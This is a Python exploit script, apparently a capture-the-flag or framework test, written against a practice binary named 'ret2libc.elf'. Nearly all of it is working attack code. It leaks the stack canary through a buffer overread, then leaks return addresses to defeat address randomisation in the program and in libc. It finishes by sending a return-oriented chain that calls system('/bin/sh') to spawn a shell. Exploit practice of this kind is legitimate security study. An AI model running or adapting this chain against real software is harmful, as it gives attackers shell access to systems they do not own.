from sploit.until import lastline, contains, equals
from sploit.arch import btoi, arch
from sploit.mem import Symtbl
from sploit.payload import Payload
from sploit.rev import r2, ldd
from sploit.rev.elf import ELF

import re

elf = ELF('ret2libc.elf')
elf.sym.leak = elf.retaddr(elf.sym.main,elf.sym.vuln)[0]
elf.sym.ret = elf.retgad()

stack = elf.locals.vuln
stack.ret = arch.wordsize
stack_main = elf.locals.main
stack_main.ret = arch.wordsize
stack.prevframe = (stack_main,stack.ret+arch.wordsize)
stack.rebase(stack.buf)

libc = elf.libs['libc.so.6']
libc.sym.pop_rdi = libc.egad('pop rdi;ret')

#main() either returns into __libc_start_main() or __libc_start_call_main()
#find a call to exit in one of those and go back an instruction
#this should be the return address of main()
def search_for_exit_call(xref_from):
    xrefs = r2.run_cmd(libc.path,f's {hex(xref_from)};af;axq')
    xrefs = [re.split(r'\s+',x) for x in xrefs]
    xrefs = [x for x in xrefs if int(x[2],0)==libc.sym.exit]
    return xrefs
xrefs = search_for_exit_call(libc.sym.__libc_start_main)
xrefs = xrefs if len(xrefs) > 0 else search_for_exit_call(libc.sym.__libc_start_call_main)
libc.sym.leak = int(r2.run_cmd(libc.path,f's {xrefs[0][0]};so -1;s')[0],0)

#https://libc.rip/
#puts - 0x450
#read - 0xff0
#libc = Symtbl(
#    puts=0x84450,
#    read=0x10dff0,
#    exit=0x46a70,
#    system=0x522c0,
#    binsh=0x1b45bd
#)

def menu(choice):
    io.readlineuntil(lastline,contains,b'Choice')
    io.writeline(choice)

p = Payload().bin(b'GREP').pad_front(stack.canary+1)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
io.write(p())
io.readuntil(equals, b'.*GREP')
canary = b'\x00' + io.read(arch.wordsize-1)
canary = btoi(canary)
print("Leaked Canary: "+hex(canary))

p = Payload().bin(b'GREP').pad_front(stack.ret)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
io.write(p())
io.readuntil(equals, b'.*GREP')
addr = io.readline()[:-1]
addr = btoi(addr)
print("Leaked Return Address of vuln() into main(): "+hex(addr))
elf.sym = elf.sym.map(addr,elf.sym.leak)

p = Payload().bin(b'GREP').pad_front(stack.prevframe.ret)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
io.write(p())
io.readuntil(equals, b'.*GREP')
addr = io.readline()[:-1]
addr = btoi(addr)
print("Leaked Return Address of main() into libc: "+hex(addr))
libc.sym = libc.sym.map(addr,libc.sym.leak)

p = Payload().pad(stack.canary).int(canary).sbp()

#align
p.ret(elf.sym.ret)

p.ret(libc.sym.pop_rdi)
p.int(libc.sym._bin_sh)
p.ret(libc.sym.system)

p.ret(libc.sym.pop_rdi)
p.int(0)
p.ret(libc.sym.exit)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
print("Injecting ROP")
print("Calling system(\"/bin/sh\") with addresses: "+hex(libc.sym.system)+" "+hex(libc.sym._bin_sh))
print("Calling exit(0) with address: "+hex(libc.sym.exit))
io.write(p())

menu(b'2')

import time
time.sleep(0.1)

#io.interact()
io.writeline(b"echo \"Win!\"")
io.writeline(b"exit")

